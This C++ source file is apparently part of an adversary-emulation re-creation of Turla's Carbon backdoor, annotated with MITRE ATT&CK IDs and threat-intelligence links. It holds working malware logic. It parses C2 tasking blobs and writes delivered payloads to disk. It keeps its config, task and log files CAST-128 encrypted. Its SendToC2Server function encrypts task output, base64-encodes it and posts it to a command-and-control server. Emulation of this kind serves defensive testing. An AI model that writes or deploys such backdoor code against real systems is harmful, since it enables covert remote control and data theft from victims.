#include <Tasks.hpp>
#include <memory.h>
#include <windows.h>
#include <iostream>
#include <sstream>

#include "EncUtils.hpp"
#include "HttpClient.hpp"
#include "Util.hpp"
#include "Logging.hpp"

std::tuple<std::shared_ptr<char[]>, int> PackageBytes(WinApiWrapperInterface* api_wrapper, std::initializer_list<std::tuple<const void*, int>> itemsToPackage){
    // Get total buffer size
    auto sumSizes = [](int accum, std::tuple<const void*,int> nextItem)
        { return accum + std::get<1>(nextItem); };
    const int bufferSize = std::accumulate(itemsToPackage.begin(), itemsToPackage.end(), 0, sumSizes);
    
    // Fill in buffer
    auto addToBuffer = [bufferSize, api_wrapper](std::tuple<std::shared_ptr<char[]>, int> accum, std::tuple<const void*, int> nextItem)
        {
            // Error case - just return empty
            if (std::get<1>(accum) < 0 || std::get<0>(accum) == nullptr) return accum;
            // If the next item is empty, then pass
            if (std::get<1>(nextItem) <= 0) return accum;
            // Copy data
            auto errNo = memcpy_s(
                std::get<0>(accum).get() + std::get<1>(accum), bufferSize - std::get<1>(accum), // Dest
                std::get<0>(nextItem), std::get<1>(nextItem)                                    // Source
                );
            // Check for new error
            if (errNo != 0) {
                logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Error copying packaged bytes to buffer: " + std::to_string(errNo));
                return std::make_tuple(std::get<0>(accum), std::get<1>(accum) * -1);
            }
            // Return the buffer and new current location
            return std::make_tuple(std::get<0>(accum), std::get<1>(accum) + std::get<1>(nextItem));
        };
    return std::accumulate(itemsToPackage.begin(), itemsToPackage.end(), std::make_tuple(std::make_shared<char[]>(bufferSize), 0), addToBuffer);
};

/**** Start of section dedicated to incoming task information ****/

bool Task::ExtractData(std::shared_ptr<byte[]> taskData, size_t taskDataSize) {
    WinApiWrapper api_wrapper;
/**
 * Split out the data into appropriate chunks
 */

/* Chunks layout:
    byte offset | field
0           | task ID (int)
4           | routing blob length f (int)
8           | routing blob (bytes to be interpreted as string)
f + 8       | task code (int)
f + 12      | length l of task payload (int)
f + 16      | payload blob (bytes)
f + l + 16  | length c of config data
f + l + 20  | config data (bytes to be interpreted as string)
*/
    // Get TaskId at 0, size of 4
    if (taskDataSize < 4) {
        logging::LogMessage(&api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Task::ExtractData Not enough data for taskId.");
        return false;
    };
    memcpy(&taskId, taskData.get(), sizeof(int));

    // Get Routing Blob Length at 4, size 4
    if (taskDataSize < 8) {
        logging::LogMessage(&api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Task::ExtractData Not enough data for routingBlockLen.");
        return false;
    };
    memcpy(&routingBlockLen, &taskData[4], sizeof(int));
    if (routingBlockLen < 0){
        logging::LogMessage(&api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Task::ExtractData RoutingBlockLen is less than 0.");
        return false;
    }

    // Get Routing Blob length at 8, size is routingBlockLen
    if (taskDataSize < 8 + routingBlockLen) {
        logging::LogMessage(&api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Task::ExtractData Not enough data for routingBlob.");
        return false;
    };
    routingBlock = std::make_shared<std::string>();
    if (routingBlockLen > 0){
        
        for (int str_idx = 0; str_idx < routingBlockLen; str_idx++){
            routingBlock->push_back(taskData[8+str_idx]);
        }
    }
    
    // Get Task Code at 8+routingBlockLen, size is 4
    if (taskDataSize < 8 + routingBlockLen + 4){
        logging::LogMessage(&api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Task::ExtractData Not enough data for taskCode.");
        return false;
    };
    memcpy(&taskCode, &taskData[8 + routingBlockLen], sizeof(int));
    
    // Get Task Payload Length at 12+routingBlockLen, size is 4
    if (taskDataSize < 12 + routingBlockLen + 4){
        logging::LogMessage(&api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Task::ExtractData Not enough data for task payload length.");
        return false;
    };
    memcpy(&taskPayloadLen, &taskData[12 + routingBlockLen], sizeof(int));
    if (taskPayloadLen < 0){
        logging::LogMessage(&api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Task::ExtractData taskPayloadLen is less than 0.");
        return false;
    }

    // Get Task Payload at 16+routingBlockLen, size is taskPayloadLen
    if ( taskDataSize < 16 + routingBlockLen + taskPayloadLen){
        logging::LogMessage(&api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Task::ExtractData Not enough data for task payload.");
        return false;
    };
    taskPayload = std::make_shared<byte[]>(taskPayloadLen);
    if (taskPayloadLen > 0){
        memcpy(taskPayload.get(), &taskData[16 + routingBlockLen], taskPayloadLen);
    }

    // Get config data length at 16+routingBlockLen+taskPayloadLen, size if 4
    if (taskDataSize < 16 + routingBlockLen + taskPayloadLen + 4){
        logging::LogMessage(&api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Task::ExtractData Not enough data for task config length.");
        return false;
    };
    memcpy(&configDataLen, &taskData[16 + routingBlockLen + taskPayloadLen], sizeof(int));
    if (configDataLen < 0){
        logging::LogMessage(&api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Task::ExtractData configDataLen is less than 0.");
        return false;
    }

    // Get config data at 20+routingBlockLen+taskPayloadLen, size is configDataLen
    if (taskDataSize < 20 + routingBlockLen + taskPayloadLen + configDataLen){
        logging::LogMessage(&api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Task::ExtractData Not enough data for task config data.");
        return false;
    }
    configData = std::make_shared<std::string>();
    if (configData > 0){
        for (int strIdx = 0; strIdx < configDataLen; strIdx++){
            configData->push_back(taskData[20 + routingBlockLen + taskPayloadLen + strIdx]);
        }
    }
    return true;


};

// Create task list file if it does not already exist
bool Task::CreateTaskListFile(WinApiWrapperInterface* api_wrapper){
    std::wstring base_folder = util::ConvertStringToWstring(carbonBaseFolder);
    DWORD base_path_attribs = api_wrapper->GetFileAttributesWrapper(base_folder.c_str());
    if (base_path_attribs == INVALID_FILE_ATTRIBUTES) {
        logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Carbon base path " + carbonBaseFolder + " does not exist.");
        return FALSE;
    }

    // Create task list file
    std::string task_list_file_path_str = taskListFile();
    std::wstring task_list_file_path = util::ConvertStringToWstring(task_list_file_path_str);
    if (api_wrapper->GetFileAttributesWrapper(task_list_file_path.c_str()) == INVALID_FILE_ATTRIBUTES){
        HANDLE h_task_list_file = api_wrapper->CreateFileWrapper(
            task_list_file_path.c_str(),    // name of the write
            GENERIC_WRITE,          // open for writing
            0,                      // do not share
            NULL,                   // default security
            CREATE_NEW,             // create new file only
            FILE_ATTRIBUTE_NORMAL,  // normal file
            NULL
        );  
        if (h_task_list_file == INVALID_HANDLE_VALUE) {
            DWORD error = api_wrapper->GetLastErrorWrapper();
            if (error != ERROR_FILE_EXISTS) {
                logging::LogMessage(
                    api_wrapper, 
                    LOG_TASKING,
                    LOG_LEVEL_ERROR, 
                    "Failed to make file " + task_list_file_path_str + ". Error code: " + std::to_string(error)
                );
                return FALSE; 
            }
        }
        if (h_task_list_file != INVALID_HANDLE_VALUE) {
            api_wrapper->CloseHandleWrapper(h_task_list_file);
        }
    }
    return TRUE;
}

/*
 * ReadEncryptedFile:
 *      About:
 *          Reads in cast-128 encrypted file and returns plaintext output. Assumes caller has necessary mutexes if needed.
 *      Result:
 *          Returns char vector containing decrypted plaintext file contents.
 *      MITRE ATT&CK Techniques:
 *          T1140: Deobfuscate/Decode Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *          https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 */
std::vector<char> ReadEncryptedFile(WinApiWrapperInterface* api_wrapper, std::string file_path, bool* success) {
    std::vector<char> ciphertext = api_wrapper->ReadFileIntoVectorWrapper(file_path, success);
    if (ciphertext.size() > 0) {
        return cast128_enc::Cast128Decrypt(ciphertext, cast128_enc::kCast128Key);
    } else {
        return std::vector<char>(0);
    }
}

/*
 * Task::SaveToFile:
 *      About:
 *          Write output to file. Will append if append_to_file is set to true. Will CAST-128 encrypt if encrypt is set to true.
 *      Result:
 *          Returns true on success, false otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/fileio/opening-a-file-for-reading-or-writing#example-open-a-file-for-writing
 */
bool Task::SaveToFile(
    WinApiWrapperInterface* api_wrapper, 
    const std::string file_path, 
    const char* buffer, 
    DWORD buffer_len, 
    bool append_to_file,
    bool encrypt
) {
    if (buffer_len <= 0) {
        logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Need a buffer length greater than 0 to save to file. Provided: " + std::to_string(buffer_len));
        return FALSE;
    }
    const char* write_buf = buffer;
    DWORD dw_bytes_to_write = buffer_len;
    std::vector<char> ciphertext;
    if (encrypt) {
        std::vector<char> plaintext;
        if (append_to_file) {
            // Need to decrypt file, append in memory, and re-encrypt
            if (!api_wrapper->FileExistsWrapper(file_path)) {
                logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_DEBUG, "File " + file_path + " does not exist. Will attempt to create it.");
                plaintext = std::vector<char>(0);
            } else {
                bool read_success = FALSE;
                try {
                    plaintext = ReadEncryptedFile(api_wrapper, file_path, &read_success);
                } catch (const std::exception& ex) {
                    logging::LogMessage(
                        api_wrapper, 
                        LOG_TASKING,
                        LOG_LEVEL_ERROR, 
                        "Cast128 exception when decrypting file " + file_path + ": " + std::string(ex.what())
                    );
                    return FALSE;
                }
                if (!read_success) {
                    logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Failed to read and decrypt encrypted file " + file_path);
                    return FALSE;
                }
            }
            plaintext.insert(plaintext.end(), buffer, buffer + buffer_len);
        } else {
            plaintext = std::vector<char>(buffer, buffer + buffer_len);
        }
        try {
            ciphertext = cast128_enc::Cast128Encrypt(plaintext, cast128_enc::kCast128Key);
        } catch (const std::exception& ex) {
            logging::LogMessage(
                api_wrapper, 
                LOG_TASKING,
                LOG_LEVEL_ERROR, 
                "Cast128 exception when encrypting data to write to " + file_path + ": " + std::string(ex.what())
            );
            return FALSE;
        }
        write_buf = &ciphertext[0];
        dw_bytes_to_write = (DWORD)ciphertext.size();
    }

    DWORD dw_bytes_written = 0;
    BOOL b_error_flag = FALSE;
    HANDLE h_file = api_wrapper->CreateFileWrapper(
        util::ConvertStringToWstring(file_path).c_str(),   // name of the write
        append_to_file && !encrypt ? FILE_APPEND_DATA : GENERIC_WRITE, // open for writing
        0,                                                 // do not share
        NULL,                                              // default security
        append_to_file ? OPEN_ALWAYS : CREATE_ALWAYS,      // create new file only
        FILE_ATTRIBUTE_NORMAL,                             // normal file
        NULL                                               // no attr. template
    );                  

    if (h_file == INVALID_HANDLE_VALUE) { 
        logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Unable to open file " + file_path + " for write.");
        return FALSE;
    }
    logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_DEBUG, "Writing " + std::to_string(dw_bytes_to_write) + " bytes to " + file_path);
    b_error_flag = api_wrapper->WriteFileWrapper( 
        h_file,            // open file handle
        write_buf,         // start of data to write
        dw_bytes_to_write, // number of bytes to write
        &dw_bytes_written, // number of bytes that were written
        NULL               // no overlapped structure
    );            

    if (!b_error_flag) {
        logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Unable to write to file. Error code " + std::to_string(api_wrapper->GetLastErrorWrapper()));
        api_wrapper->CloseHandleWrapper(h_file);
        return FALSE;
    } else {
        if (dw_bytes_written != dw_bytes_to_write) {
            // This is an error because a synchronous write that results in
            // success (WriteFile returns TRUE) should write all data as
            // requested. This would not necessarily be the case for
            // asynchronous writes.
            api_wrapper->CloseHandleWrapper(h_file);
            logging::LogMessage(
                api_wrapper, 
                LOG_TASKING, 
                LOG_LEVEL_ERROR, 
                "Error: Unable to write all " + std::to_string(dw_bytes_to_write) + " bytes. Only wrote " +std::to_string(dw_bytes_written)
            );
            return false;
        }
    }
    api_wrapper->CloseHandleWrapper(h_file);
    return true;
}

/*
 * Task::SaveConfigFile:
 *      About:
 *          Save task config file to disk, CAST-128 encrypted.
 *      Result:
 *          Returns true on success, false otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
bool Task::SaveConfigFile(WinApiWrapperInterface* api_wrapper){
    if (configData->length() == 0){
        return false;
    }
    return SaveToFile(api_wrapper, getConfigFile(), configData.get()->c_str(), (DWORD)configData->length(), false, true);
}

/*
 * Task::SavePayload:
 *      About:
 *          Save payload to disk, in plaintext.
 *      Result:
 *          Returns true on success, false otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1105: Ingress Tool Transfer
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
bool Task::SavePayload(WinApiWrapperInterface* api_wrapper){
    auto configFile = getConfigFile();
    if (configFile.length() == 0) return false;
    auto configParams = ParseConfigString(*(getConfig().get()));
    if (configParams == nullptr) return false;         
    auto configSectionInfo = configParams->find(configSection);
    if (configSectionInfo == configParams->end()){
        logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Unable to find config section in config file");
        return false;
    }
    auto configPayloadLocation = configSectionInfo->second.find(configFileNameParam);
    if (configPayloadLocation != configSectionInfo->second.end()){
        payloadPath = configPayloadLocation->second;
        logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_INFO, "Saving payload to " + payloadPath);
        return SaveToFile(api_wrapper, payloadPath, (char*)taskPayload.get(), (DWORD)taskPayloadLen, false, false);
    }
    logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_INFO, "No payload provided in task config file.");
    return false;

}

/*
 * Task::AppendTaskInfo:
 *      About:
 *          Appends encrypted tasking info to the encrypted pending task file.
 *      Result:
 *          Returns true on success, false otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
bool Task::AppendTaskInfo(WinApiWrapperInterface* api_wrapper){
    std::string newTaskLine =  std::to_string(taskId)  + taskInfoSeperatorPretty +                       // Task ID
        payloadPath         + taskInfoSeperatorPretty +                       // Task payload path
        getConfigFile()         + taskInfoSeperatorPretty +                       // Task config path
        carbonBaseFolder + pathSeperator + resultsNumberFolder + pathSeperator + std::to_string(taskId) + resultFileExtension + taskInfoSeperatorPretty + // Task result path
        carbonBaseFolder + pathSeperator + logNumberFolder + pathSeperator + std::to_string(taskId) + logFileExtension                      // Task log path
        + "\n";

    logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_DEBUG, "Saving task line: " + newTaskLine);
    return SaveToFile(api_wrapper, taskListFile(), newTaskLine.c_str(), (DWORD)newTaskLine.length(), true, true);
    return false;
}

/**** Start of section dedicated to out-going task information ****/
std::list<std::shared_ptr<TaskReport>> TaskReport::getReportableTasks(WinApiWrapperInterface* api_wrapper, const std::string task_report_file){
    /************* Read file as lines. Filter out empty lines. *************/
    // Create empty list
    auto taskReportList = std::list<std::shared_ptr<TaskReport>>();

    bool read_success = FALSE;
    std::vector<char> file_contents;
    if (!api_wrapper->FileExistsWrapper(task_report_file)) {
        logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_DEBUG, "Task report file " + task_report_file + " does not exist. Skipping.");
        return taskReportList;
    }
    // Lock the task output mutex for the rest of this function
    static Mutex mutex{taskOutputMutex};
    Locker taskOutputLock(mutex);

    try {
        // Read task output
        file_contents = ReadEncryptedFile(api_wrapper, task_report_file, &read_success);
    } catch (const std::exception& ex) {
        logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "cast128 exception when decrypting file " + task_report_file + ": " + std::string(ex.what()));
        return taskReportList;
    }
    
    if (!read_success) {
        logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Could not read and decrypt file " + task_report_file);
        return taskReportList;
    }

    std::istringstream input_stream(std::string(file_contents.begin(), file_contents.end()));
    std::string current_block;

    // For each line, split by line seperator (no spaces). 
    for (std::string current_line; std::getline(input_stream, current_line); ) {
        if (current_line.length() > 0){
            // add new item into list used shared_ptr.
            std::vector<std::string> blocks;
            std::istringstream current_line_stream(current_line);
            while (std::getline(current_line_stream, current_block, taskInfoSeperator)) {
                blocks.push_back(trim(current_block));
            }

            // Format of each line should be: 
            //  task_id | "1" | task_log_filepath | object_id
            if (blocks.size() != 4){
                logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Number of task output info line entries is incorrect! Should be 4, got " + std::to_string(blocks.size()));
                return taskReportList;
            }

            // The second block needs to be 1 or 2
            int reported_num = -1;
            try{
                reported_num = std::stoi(blocks[1]);
            }
            catch (std::invalid_argument const&){
                logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Could not convert task output info numfiles to int: " + blocks[1]);
                return taskReportList;
            }
            // Only 1 is allowed for now.
            if (reported_num != 1){
                logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Cannot send more than one task output file per blob. Requested " + std::to_string(reported_num));
                return taskReportList;
            }
            taskReportList.push_back(std::make_shared<TaskReport>(std::stoi(blocks[0]), reported_num, blocks[2], blocks[3])); 
        }
    }

    // Clear task output file
    api_wrapper->ClearFileWrapper(task_report_file);

    return taskReportList;
}

std::tuple<std::shared_ptr<char[]>, int> TaskReport::BuildBlob(WinApiWrapperInterface* api_wrapper) {
    /**
     * Format outgoing data to server.
     * 
     * Format should be: task_id | val | tmp_filesize | tmp_content | [OPTIONAL (if val == 2) tmp2_filesize | tmp2_content] | len_object_id | object_id
     * Val may be 1 or 2 (just 1 is allowed for now) to determine how many files to send. 
     * tmp_filesize should be the size of task_log_filepath
     * tmp_content should be the data from task_log_filepath
     * 
     * Blob may be base64 encoded.
     */

    bool read_success = FALSE;
    std::vector<char> file_contents;
    try {
        file_contents = ReadEncryptedFile(api_wrapper, logFile, &read_success);
    } catch (const std::exception& ex) {
        logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "cast128 exception when decrypting task log file " + logFile + ": " + std::string(ex.what()));
        return std::make_tuple(std::shared_ptr<char[]>(nullptr), -1);
    }

    if (!read_success) {
        logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_ERROR, "Could not read and decrypt task log file " + logFile);
        return std::make_tuple(std::shared_ptr<char[]>(nullptr), -1);
    }

    int log_size = (int)file_contents.size();
    int objectIDLen = (int)objectID.length();

    return PackageBytes(api_wrapper, {
        std::make_tuple(&taskID, 4),
        std::make_tuple(&numFiles, 4),
        std::make_tuple(&log_size, 4),
        std::make_tuple(log_size > 0 ? &file_contents[0] : nullptr, log_size),
        std::make_tuple(&objectIDLen, 4),
        std::make_tuple(objectID.c_str(), objectIDLen)
    } );
};

/*
 * Task::SendToC2Server:
 *      About:
 *          Sends task output to C2 server via HTTP post request.
 *          POST data is CAST-128 encrypted and then base-64 encoded.
 *      Result:
 *          Returns true on success, false otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocols
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1132.001: Data Encoding: Standard Encoding
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
bool TaskReport::SendToC2Server(
    WinApiWrapperInterface* api_wrapper, 
    std::shared_ptr<HttpConnection> httpConnection, 
    std::string httpResource, 
    std::string uuid_override
) {
    // Build the data to send to server
    auto [data, dataLength] = BuildBlob(api_wrapper);

    // Encrypt data 
    std::vector<char> dataAsVector{data.get(), data.get() + dataLength};
    auto encryptedData = cast128_enc::Cast128Encrypt(dataAsVector, cast128_enc::kCast128Key);

    // Base64 Encode data
    auto encodedEncryptedData = encodeData((byte*)&encryptedData[0], encryptedData.size());
    std::vector<char> encodedEncryptedDataAsChar(encodedEncryptedData.begin(), encodedEncryptedData.end());

    // Create http session
    auto httpSession = httpConnection->StartSession(api_wrapper, httpResource, uuid_override);

    // Send out the data
    return httpSession != nullptr && httpSession->SendData(api_wrapper, &encodedEncryptedDataAsChar[0], (DWORD)encodedEncryptedDataAsChar.size());

}
